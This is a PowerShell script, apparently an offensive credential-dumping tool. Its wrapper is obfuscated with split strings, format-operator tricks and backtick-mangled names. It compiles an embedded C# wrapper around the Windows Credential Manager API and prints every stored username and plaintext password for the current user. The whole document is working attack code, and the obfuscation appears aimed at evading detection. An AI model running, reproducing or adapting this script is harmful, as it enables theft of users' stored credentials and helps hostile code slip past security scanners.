  SeT  G5Fz9D ( [TypE]("{1}{0}" -F'ng','StRi'))  ;    sET-ITEM varIabLe:MQv  (  [TYPE]("{1}{0}" -f'ay','Arr') )  ;    set-ItEm ('vaRIa'+'bL'+'E:0'+'so')  ( [tYpe]("{1}{2}{0}{3}" -F'S.Cr','PS','Util','EdMAN') ) ;

[String] ${PSCr`edmA`N`UtiLS} = @"
using System;
using System.Runtime.InteropServices;

namespace PsUtils
{
    public class CredMan
    {
        #region Imports
        // DllImport derives from System.Runtime.InteropServices
        [DllImport("Advapi32.dll", SetLastError = true, EntryPoint = "CredDeleteW", CharSet = CharSet.Unicode)]
        private static extern bool CredDeleteW([In] string target, [In] CRED_TYPE type, [In] int reservedFlag);

        [DllImport("Advapi32.dll", SetLastError = true, EntryPoint = "CredEnumerateW", CharSet = CharSet.Unicode)]
        private static extern bool CredEnumerateW([In] string Filter, [In] int Flags, out int Count, out IntPtr CredentialPtr);

        [DllImport("Advapi32.dll", SetLastError = true, EntryPoint = "CredFree")]
        private static extern void CredFree([In] IntPtr cred);

        [DllImport("Advapi32.dll", SetLastError = true, EntryPoint = "CredReadW", CharSet = CharSet.Unicode)]
        private static extern bool CredReadW([In] string target, [In] CRED_TYPE type, [In] int reservedFlag, out IntPtr CredentialPtr);

        [DllImport("Advapi32.dll", SetLastError = true, EntryPoint = "CredWriteW", CharSet = CharSet.Unicode)]
        private static extern bool CredWriteW([In] ref Credential userCredential, [In] UInt32 flags);
        #endregion

        #region Fields
        public enum CRED_FLAGS : uint
        {
            NONE = 0x0,
            PROMPT_NOW = 0x2,
            USERNAME_TARGET = 0x4
        }

        public enum CRED_ERRORS : uint
        {
            ERROR_SUCCESS = 0x0,
            ERROR_INVALID_PARAMETER = 0x80070057,
            ERROR_INVALID_FLAGS = 0x800703EC,
            ERROR_NOT_FOUND = 0x80070490,
            ERROR_NO_SUCH_LOGON_SESSION = 0x80070520,
            ERROR_BAD_USERNAME = 0x8007089A
        }

        public enum CRED_PERSIST : uint
        {
            SESSION = 1,
            LOCAL_MACHINE = 2,
            ENTERPRISE = 3
        }

        public enum CRED_TYPE : uint
        {
            GENERIC = 1,
            DOMAIN_PASSWORD = 2,
            DOMAIN_CERTIFICATE = 3,
            DOMAIN_VISIBLE_PASSWORD = 4,
            GENERIC_CERTIFICATE = 5,
            DOMAIN_EXTENDED = 6,
            MAXIMUM = 7,      // Maximum supported cred type
            MAXIMUM_EX = (MAXIMUM + 1000),  // Allow new applications to run on old OSes
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct Credential
        {
            public CRED_FLAGS Flags;
            public CRED_TYPE Type;
            public string TargetName;
            public string Comment;
            public DateTime LastWritten;
            public UInt32 CredentialBlobSize;
            public string CredentialBlob;
            public CRED_PERSIST Persist;
            public UInt32 AttributeCount;
            public IntPtr Attributes;
            public string TargetAlias;
            public string UserName;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct NativeCredential
        {
            public CRED_FLAGS Flags;
            public CRED_TYPE Type;
            public IntPtr TargetName;
            public IntPtr Comment;
            public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
            public UInt32 CredentialBlobSize;
            public IntPtr CredentialBlob;
            public UInt32 Persist;
            public UInt32 AttributeCount;
            public IntPtr Attributes;
            public IntPtr TargetAlias;
            public IntPtr UserName;
        }
        #endregion

        #region Child Class
        private class CriticalCredentialHandle : Microsoft.Win32.SafeHandles.CriticalHandleZeroOrMinusOneIsInvalid
        {
            public CriticalCredentialHandle(IntPtr preexistingHandle)
            {
                SetHandle(preexistingHandle);
            }

            private Credential XlateNativeCred(IntPtr pCred)
            {
                NativeCredential ncred = (NativeCredential)Marshal.PtrToStructure(pCred, typeof(NativeCredential));
                Credential cred = new Credential();
                cred.Type = ncred.Type;
                cred.Flags = ncred.Flags;
                cred.Persist = (CRED_PERSIST)ncred.Persist;

                long LastWritten = ncred.LastWritten.dwHighDateTime;
                LastWritten = (LastWritten << 32) + ncred.LastWritten.dwLowDateTime;
                cred.LastWritten = DateTime.FromFileTime(LastWritten);

                cred.UserName = Marshal.PtrToStringUni(ncred.UserName);
                cred.TargetName = Marshal.PtrToStringUni(ncred.TargetName);
                cred.TargetAlias = Marshal.PtrToStringUni(ncred.TargetAlias);
                cred.Comment = Marshal.PtrToStringUni(ncred.Comment);
                cred.CredentialBlobSize = ncred.CredentialBlobSize;
                if (0 < ncred.CredentialBlobSize)
                {
                    cred.CredentialBlob = Marshal.PtrToStringUni(ncred.CredentialBlob, (int)ncred.CredentialBlobSize / 2);
                }
                return cred;
            }

            public Credential GetCredential()
            {
                if (IsInvalid)
                {
                    throw new InvalidOperationException("Invalid CriticalHandle!");
                }
                Credential cred = XlateNativeCred(handle);
                return cred;
            }

            public Credential[] GetCredentials(int count)
            {
                if (IsInvalid)
                {
                    throw new InvalidOperationException("Invalid CriticalHandle!");
                }
                Credential[] Credentials = new Credential[count];
                IntPtr pTemp = IntPtr.Zero;
                for (int inx = 0; inx < count; inx++)
                {
                    pTemp = Marshal.ReadIntPtr(handle, inx * IntPtr.Size);
                    Credential cred = XlateNativeCred(pTemp);
                    Credentials[inx] = cred;
                }
                return Credentials;
            }

            override protected bool ReleaseHandle()
            {
                if (IsInvalid)
                {
                    return false;
                }
                CredFree(handle);
                SetHandleAsInvalid();
                return true;
            }
        }
        #endregion

        #region Custom API
        public static int CredDelete(string target, CRED_TYPE type)
        {
            if (!CredDeleteW(target, type, 0))
            {
                return Marshal.GetHRForLastWin32Error();
            }
            return 0;
        }

        public static int CredEnum(string Filter, out Credential[] Credentials)
        {
            int count = 0;
            int Flags = 0x0;
            if (string.IsNullOrEmpty(Filter) ||
                "*" == Filter)
            {
                Filter = null;
                if (6 <= Environment.OSVersion.Version.Major)
                {
                    Flags = 0x1; //CRED_ENUMERATE_ALL_CREDENTIALS; only valid is OS >= Vista
                }
            }
            IntPtr pCredentials = IntPtr.Zero;
            if (!CredEnumerateW(Filter, Flags, out count, out pCredentials))
            {
                Credentials = null;
                return Marshal.GetHRForLastWin32Error(); 
            }
            CriticalCredentialHandle CredHandle = new CriticalCredentialHandle(pCredentials);
            Credentials = CredHandle.GetCredentials(count);
            return 0;
        }

        public static int CredRead(string target, CRED_TYPE type, out Credential Credential)
        {
            IntPtr pCredential = IntPtr.Zero;
            Credential = new Credential();
            if (!CredReadW(target, type, 0, out pCredential))
            {
                return Marshal.GetHRForLastWin32Error();
            }
            CriticalCredentialHandle CredHandle = new CriticalCredentialHandle(pCredential);
            Credential = CredHandle.GetCredential();
            return 0;
        }

        public static int CredWrite(Credential userCredential)
        {
            if (!CredWriteW(ref userCredential, 0))
            {
                return Marshal.GetHRForLastWin32Error();
            }
            return 0;
        }

        #endregion

        private static int AddCred()
        {
            Credential Cred = new Credential();
            string Password = "Password";
            Cred.Flags = 0;
            Cred.Type = CRED_TYPE.GENERIC;
            Cred.TargetName = "Target";
            Cred.UserName = "UserName";
            Cred.AttributeCount = 0;
            Cred.Persist = CRED_PERSIST.ENTERPRISE;
            Cred.CredentialBlobSize = (uint)Password.Length;
            Cred.CredentialBlob = Password;
            Cred.Comment = "Comment";
            return CredWrite(Cred);
        }

        private static bool CheckError(string TestName, CRED_ERRORS Rtn)
        {
            switch(Rtn)
            {
                case CRED_ERRORS.ERROR_SUCCESS:
                    Console.WriteLine(string.Format("'{0}' worked", TestName));
                    return true;
                case CRED_ERRORS.ERROR_INVALID_FLAGS:
                case CRED_ERRORS.ERROR_INVALID_PARAMETER:
                case CRED_ERRORS.ERROR_NO_SUCH_LOGON_SESSION:
                case CRED_ERRORS.ERROR_NOT_FOUND:
                case CRED_ERRORS.ERROR_BAD_USERNAME:
                    Console.WriteLine(string.Format("'{0}' failed; {1}.", TestName, Rtn));
                    break;
                default:
                    Console.WriteLine(string.Format("'{0}' failed; 0x{1}.", TestName, Rtn.ToString("X")));
                    break;
            }
            return false;
        }

        /*
         * Note: the Main() function is primarily for debugging and testing in a Visual 
         * Studio session.  Although it will work from PowerShell, it's not very useful.
         */
        public static void Main()
        {
            Credential[] Creds = null;
            Credential Cred = new Credential();
            int Rtn = 0;

            Console.WriteLine("Testing CredWrite()");
            Rtn = AddCred();
            if (!CheckError("CredWrite", (CRED_ERRORS)Rtn))
            {
                return;
            }
            Console.WriteLine("Testing CredEnum()");
            Rtn = CredEnum(null, out Creds);
            if (!CheckError("CredEnum", (CRED_ERRORS)Rtn))
            {
                return;
            }
            Console.WriteLine("Testing CredRead()");
            Rtn = CredRead("Target", CRED_TYPE.GENERIC, out Cred);
            if (!CheckError("CredRead", (CRED_ERRORS)Rtn))
            {
                return;
            }
            Console.WriteLine("Testing CredDelete()");
            Rtn = CredDelete("Target", CRED_TYPE.GENERIC);
            if (!CheckError("CredDelete", (CRED_ERRORS)Rtn))
            {
                return;
            }
            Console.WriteLine("Testing CredRead() again");
            Rtn = CredRead("Target", CRED_TYPE.GENERIC, out Cred);
            if (!CheckError("CredRead", (CRED_ERRORS)Rtn))
            {
                Console.WriteLine("if the error is 'ERROR_NOT_FOUND', this result is OK.");
            }
        }
    }
}
"@


${ps`C`REdmAN} = ${NU`LL}
try
{
    ${pSCR`Edm`AN} = [PsUtils.CredMan]
}
catch
{
    
    ${e`RR`or}.("{0}{1}{2}"-f 'Remov','e','At').Invoke(${eR`ROR}."C`ounT"-1)
}
if(${N`UlL} -eq ${p`s`crEDMaN})
{
    &("{0}{1}{2}"-f'Add','-','Type') ${P`SC`ReDmanU`TIlS}
}


[HashTable] ${erR`o`RCa`TEGo`RY} = @{0x80070057 = ("{0}{2}{1}" -f 'Inv','t','alidArgumen');
                               0x800703EC = ("{2}{1}{0}" -f 'a','Dat','Invalid');
                               0x80070490 = ("{2}{4}{3}{0}{1}"-f'tFou','nd','Obje','o','ctN');
                               0x80070520 = ("{1}{0}{2}"-f 'curityEr','Se','ror');
                               0x8007089A = ("{1}{2}{0}"-f'tyError','Secur','i')}

function EnuM`-CrE`DS
{
    Param
    (
        [Parameter(ManDATORy=${F`A`LSE})][AllowEmptyString()][String] ${F`iltEr} =  (  GET-vARiABlE g5fz9d  ).valUE::"E`MPTY"
    )
    
    [PsUtils.CredMan+Credential[]] ${CRe`ds} =   (  itEM vaRiaBLE:MqV ).VAluE::"c`ReATein`stAN`CE"([PsUtils.CredMan+Credential], 0)
    [Int] ${RES`Ul`TS} = 0
    try
    {
        ${ReS`U`lTS} =  $0So::"cRE`DeNum"(${F`iL`Ter}, [Ref]${C`REds})
    }
    catch
    {
        return ${_}
    }
    switch(${RE`s`Ults})
    {
        0 {break}
        0x80070490 {break} 
        ("{0}{1}" -f'd','efault')
        {
            [String] ${M`SG} = ('Fai'+'le'+'d '+'t'+'o '+'en'+'umerat'+'e '+'cr'+'ed'+'entials '+'store'+' '+'f'+'or '+'u'+'ser '+"'$Env:UserName'")
            [Management.ManagementException] ${MG`mT`eX`Cep`TioN} = &("{0}{2}{1}"-f'N','-Object','ew') ("{4}{0}{1}{5}{6}{2}{3}"-f 'en','t.','pti','on','Managem','Manag','ementExce')(${M`sG})
            [Management.Automation.ErrorRecord] ${err`R`CD} = &("{2}{0}{1}{3}" -f 'e','w-Obje','N','ct') ("{4}{5}{8}{1}{3}{0}{7}{2}{6}" -f'ati','t.Aut','.ErrorRe','om','Mana','gem','cord','on','en')(${m`gM`TeXcePtion}, ${r`e`SUlTS}.("{0}{1}" -f'ToStr','ing').Invoke("X"), ${ERRoR`CA`T`E`GorY}[${rESU`l`TS}], ${n`Ull})
            return ${ERRr`Cd}
        }
    }
    return ${c`REDs}
}

function cR`EDmanMA`in
{

    ${o`FS} = "`r`n"
    [Object] ${crE`dS} = &("{2}{0}{1}" -f 'num-Cred','s','E')
    if(${crE`dS} -split [Array] -and 0 -eq ${cRE`Ds}."le`NGth")
    {
        &("{0}{3}{1}{2}" -f'W','p','ut','rite-Out') "No Credentials found for $($Env:UserName) "
        return
    }
    if(${cre`Ds} -is [Management.Automation.ErrorRecord])
    {
        return ${cR`EDs}
    }
    &("{0}{2}{1}"-f 'Wr','e-Output','it') "+-----------+--------------------------+`n"
    foreach(${cR`ED} in ${C`REdS})
    {
        [String] ${CR`edsTR} = @"
        
| UserName  | $($Cred.UserName)
| Password  | $($Cred.CredentialBlob)
| Target    | $($Cred.TargetName.Substring($Cred.TargetName.IndexOf("=")+1))
| Updated   | $([String]::Format("{0:yyyy-MM-dd HH:mm:ss}", $Cred.LastWritten.ToUniversalTime())) UTC
| Comment   | $($Cred.Comment+$OFS)
"@

        ${cR`EdSTRa`R`RY} += ${Cr`Ed`sTr}
        &("{1}{0}{2}" -f 't','Wri','e-Output') ${crEds`Tr}
        &("{0}{3}{2}{1}" -f'Wr','t','e-Outpu','it') "+-----------+--------------------------+`n"
    }
    return
}

&("{0}{2}{1}"-f 'CredM','nMain','a')